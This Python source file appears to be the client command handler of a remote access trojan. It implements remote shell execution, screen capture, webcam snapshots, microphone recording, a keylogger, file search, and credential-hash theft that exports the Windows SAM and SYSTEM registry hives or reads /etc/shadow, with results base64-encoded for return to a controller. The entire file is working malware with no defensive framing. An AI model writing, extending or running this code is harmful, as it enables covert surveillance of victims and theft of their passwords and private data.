from __future__ import annotations

import base64
import os
import platform
import shlex
import subprocess
import tempfile
from contextlib import suppress
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import cv2
import mss
import sounddevice as sd
import soundfile as sf
from PIL import Image
from pynput import keyboard

from rat.client.state import ClientState


@dataclass(frozen=True)
class CommandResult:
    ok: bool
    data: dict[str, Any]


def _run_subprocess(cmd: list[str], *, timeout: int = 30) -> tuple[int, str]:
    p = subprocess.run(  # noqa: S603
        cmd,
        capture_output=True,
        text=True,
        timeout=timeout,
        shell=False,
    )
    out = (p.stdout or "") + (p.stderr or "")
    return p.returncode, out.strip()


def cmd_help() -> CommandResult:
    return CommandResult(
        ok=True,
        data={
            "commands": [
                "help",
                "download <remote_path>",
                "upload <remote_path>",
                "shell [command]",
                "ipconfig",
                "screenshot",
                "search <pattern> [root]",
                "hashdump",
                "keylogger start|stop|dump",
                "webcam_snapshot",
                "webcam_stream start|stop",
                "record_audio <seconds>",
            ]
        },
    )


def cmd_ipconfig() -> CommandResult:
    if platform.system().lower().startswith("win"):
        code, out = _run_subprocess(["ipconfig", "/all"], timeout=20)
    else:
        code, out = _run_subprocess(["sh", "-lc", "ip a || ifconfig -a"], timeout=20)
    return CommandResult(ok=(code == 0), data={"output": out, "exit_code": code})


def cmd_search(pattern: str, root: str | None, *, max_results: int = 50) -> CommandResult:
    pat = pattern.lower()
    if not root:
        root = "C:\\" if platform.system().lower().startswith("win") else "/"
    results: list[str] = []
    for base, dirs, files in os.walk(root, topdown=True):
        dirs[:] = [d for d in dirs if d not in {".git", "__pycache__", ".venv"}]
        try:
            for name in files:
                if pat in name.lower():
                    results.append(str(Path(base) / name))
                    if len(results) >= max_results:
                        return CommandResult(ok=True, data={"results": results, "truncated": True})
        except PermissionError:
            continue
        except OSError:
            continue
    return CommandResult(ok=True, data={"results": results, "truncated": False})


def cmd_screenshot() -> CommandResult:
    with mss.mss() as sct:
        monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
        shot = sct.grab(monitor)
        img = Image.frombytes("RGB", shot.size, shot.rgb)
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
            tmp_path = Path(tmp.name)
        img.save(tmp_path, format="PNG")
        data = tmp_path.read_bytes()
        tmp_path.unlink(missing_ok=True)
    return CommandResult(
        ok=True, data={"filename": "screenshot.png", "bytes_b64": base64.b64encode(data).decode()}
    )


def cmd_webcam_snapshot() -> CommandResult:
    cap = cv2.VideoCapture(0)
    try:
        ok, frame = cap.read()
        if not ok:
            return CommandResult(ok=False, data={"error": "Cannot read webcam frame"})
        ok2, buf = cv2.imencode(".jpg", frame)
        if not ok2:
            return CommandResult(ok=False, data={"error": "JPEG encode failed"})
        data = buf.tobytes()
    finally:
        cap.release()
    return CommandResult(
        ok=True, data={"filename": "webcam.jpg", "bytes_b64": base64.b64encode(data).decode()}
    )


def cmd_record_audio(seconds: float, *, sample_rate: int = 44100) -> CommandResult:
    seconds = max(0.1, min(float(seconds), 60.0))
    frames = int(sample_rate * seconds)
    audio = sd.rec(frames, samplerate=sample_rate, channels=1, dtype="float32")
    sd.wait(timeout=int(seconds) + 5)

    with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmp:
        tmp_path = Path(tmp.name)
    sf.write(tmp_path, audio, sample_rate, format="WAV")
    data = tmp_path.read_bytes()
    tmp_path.unlink(missing_ok=True)
    return CommandResult(
        ok=True, data={"filename": "audio.wav", "bytes_b64": base64.b64encode(data).decode()}
    )


def cmd_hashdump() -> CommandResult:
    sysname = platform.system().lower()
    if sysname.startswith("win"):
        # Best-effort: requires admin. We try to export SAM + SYSTEM hives.
        with tempfile.TemporaryDirectory() as td:
            sam = str(Path(td) / "SAM.save")
            system = str(Path(td) / "SYSTEM.save")
            code1, out1 = _run_subprocess(["reg", "save", "HKLM\\SAM", sam, "/y"], timeout=20)
            code2, out2 = _run_subprocess(["reg", "save", "HKLM\\SYSTEM", system, "/y"], timeout=20)
            ok = code1 == 0 and code2 == 0
            return CommandResult(
                ok=ok,
                data={
                    "note": "Exports only (offline). Admin privileges usually required.",
                    "sam_export_ok": code1 == 0,
                    "system_export_ok": code2 == 0,
                    "output": (out1 + "\n" + out2).strip(),
                },
            )
    else:
        shadow = Path("/etc/shadow")
        if not shadow.exists():
            return CommandResult(ok=False, data={"error": "/etc/shadow not found"})
        try:
            content = shadow.read_text(encoding="utf-8", errors="replace")
        except PermissionError as exc:
            return CommandResult(ok=False, data={"error": f"PermissionError: {exc}"})
        return CommandResult(ok=True, data={"shadow": content})


def _on_key_press(state: ClientState):
    def handler(key):
        try:
            s = key.char  # type: ignore[attr-defined]
        except Exception:
            s = str(key)
        with state.keylogger.lock:
            state.keylogger.buffer.append(s)

    return handler


def cmd_keylogger(state: ClientState, action: str) -> CommandResult:
    action = action.lower()
    if action == "start":
        with state.keylogger.lock:
            if state.keylogger.running:
                return CommandResult(ok=True, data={"status": "already_running"})
            listener = keyboard.Listener(on_press=_on_key_press(state))
            listener.start()
            state.keylogger.listener = listener
            state.keylogger.running = True
        return CommandResult(ok=True, data={"status": "started"})

    if action == "stop":
        with state.keylogger.lock:
            listener = state.keylogger.listener
            state.keylogger.listener = None
            state.keylogger.running = False
        with suppress(Exception):
            if listener is not None:
                listener.stop()
        return CommandResult(ok=True, data={"status": "stopped"})

    if action == "dump":
        with state.keylogger.lock:
            data = "".join(state.keylogger.buffer)
            state.keylogger.buffer.clear()
        return CommandResult(ok=True, data={"keys": data})

    return CommandResult(ok=False, data={"error": "Usage: keylogger start|stop|dump"})


def cmd_shell(command: str | None) -> CommandResult:
    # Lightweight, cross-platform: execute a single command and return output.
    # (We also support 'shell' without args to show how to use it.)
    if not command:
        return CommandResult(ok=True, data={"usage": "shell <command> (ex: shell whoami)"})
    if platform.system().lower().startswith("win"):
        code, out = _run_subprocess(["cmd", "/c", command], timeout=60)
    else:
        code, out = _run_subprocess(["sh", "-lc", command], timeout=60)
    return CommandResult(ok=(code == 0), data={"output": out, "exit_code": code})


def parse_and_run(state: ClientState, line: str) -> CommandResult:
    parts = shlex.split(line)
    if not parts:
        return CommandResult(ok=True, data={})
    cmd = parts[0].lower()
    args = parts[1:]

    if cmd == "help":
        return cmd_help()
    if cmd == "ipconfig":
        return cmd_ipconfig()
    if cmd == "search":
        if not args:
            return CommandResult(ok=False, data={"error": "Usage: search <pattern> [root]"})
        return cmd_search(args[0], args[1] if len(args) > 1 else None)
    if cmd == "screenshot":
        return cmd_screenshot()
    if cmd == "webcam_snapshot":
        return cmd_webcam_snapshot()
    if cmd == "record_audio":
        if not args:
            return CommandResult(ok=False, data={"error": "Usage: record_audio <seconds>"})
        return cmd_record_audio(float(args[0]))
    if cmd == "hashdump":
        return cmd_hashdump()
    if cmd == "keylogger":
        if not args:
            return CommandResult(ok=False, data={"error": "Usage: keylogger start|stop|dump"})
        return cmd_keylogger(state, args[0])
    if cmd == "shell":
        return cmd_shell(" ".join(args) if args else None)

    # Placeholders for file transfer + webcam_stream (implemented via dedicated RPC commands).
    if cmd in {"download", "upload", "webcam_stream"}:
        return CommandResult(
            ok=False,
            data={"error": f"'{cmd}' must be called through dedicated RPC flow from the server."},
        )

    return CommandResult(ok=False, data={"error": f"Unknown command: {cmd} (try help)"})
